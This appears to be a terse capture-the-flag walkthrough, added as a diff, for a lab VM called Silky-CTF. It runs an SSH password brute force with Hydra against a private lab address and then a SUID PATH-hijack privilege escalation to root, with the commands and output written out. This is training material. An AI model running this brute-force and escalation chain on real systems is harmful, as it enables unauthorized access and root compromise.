@@ -1,0 +1,62 @@
+
+Ich muss unbedingt das Passwort aus der Seite entfernen, immerhin fehlen die letzten 2 Zeichen. Aber trotzdem.
+Trad.
+I absolutely have to remove the password from the page, after all, the last 2 characters are missing. But still.
+
+
+Look in script.js  --> //  s1lKy
+
+
+GEN. PASSWORD
+use ./script.sh
+
+Hydra
+hydra -P pass.txt -l silky 192.168.56.102 -t 4 ssh
+
+[22][ssh] host: 192.168.56.102   login: silky   password: s1lKy#5
+
+Privilege escalation
+find / -perm -u=s -type f 2>/dev/nul
+
+Seide ist ein tierischer Faserstoff. Sie wird aus den Kokons der Seidenraupe, der Larve des Seidenspinners, gewonnen. 
+gezeichnet:
+root
+
+
+Silk is an animal pulp. It is extracted from the cocoons of the silkworm, the larva of the silk moth.
+drawn:
+root
+
+strings /usr/bin/sky
+
+
+silky@Silky-CTF:/tmp$ echo "/bin/sh" > whoami
+silky@Silky-CTF:/tmp$ chmd 777 whoami 
+silky@Silky-CTF:/tmp$ chmod 777 whoami 
+silky@Silky-CTF:/tmp$ export PATH=/tmp/:$PATH
+silky@Silky-CTF:/tmp$ /usr/bin/sky
+Seide ist ein tierischer Faserstoff. Sie wird aus den Kokons der Seidenraupe, der Larve des Seidenspinners, gewonnen. 
+gezeichnet:
+£ 
+£ id
+uid=1000(silky) gid=1000(silky) euid=0(root) Gruppen=1000(silky),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),113(bluetooth),114(lpadmin),119(scanner)
+£ cd
+£ cd /root	
+£ ls
+flag.txt
+£ cat flag.txt
+███████╗██╗██╗     ██╗  ██╗██╗   ██╗      ██████╗████████╗███████╗
+██╔════╝██║██║     ██║ ██╔╝╚██╗ ██╔╝     ██╔════╝╚══██╔══╝██╔════╝
+███████╗██║██║     █████╔╝  ╚████╔╝█████╗██║        ██║   █████╗  
+╚════██║██║██║     ██╔═██╗   ╚██╔╝ ╚════╝██║        ██║   ██╔══╝  
+███████║██║███████╗██║  ██╗   ██║        ╚██████╗   ██║   ██║     
+╚══════╝╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝         ╚═════╝   ╚═╝   ╚═╝     
+                                                                  
+
+
+flag: 489ca3ccb71640cce1a618a5dea48c25
+
+
+
+Congrats ;)
+
